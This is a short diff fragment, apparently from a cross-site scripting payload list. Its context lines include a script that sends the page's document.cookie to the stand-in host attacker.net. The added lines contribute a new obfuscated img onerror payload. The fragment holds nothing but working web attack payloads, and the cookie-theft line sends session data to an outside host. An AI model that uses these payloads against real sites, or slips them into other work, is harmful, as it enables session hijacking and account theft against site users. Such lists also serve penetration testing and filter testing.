@@ -51,3 +51,5 @@ body:document.cookie
 
 <script>document.location='//attacker.net/'+document.cookie</script>
 
+OnXSS=<Img/Src/OnError=(alert)(1)>
+
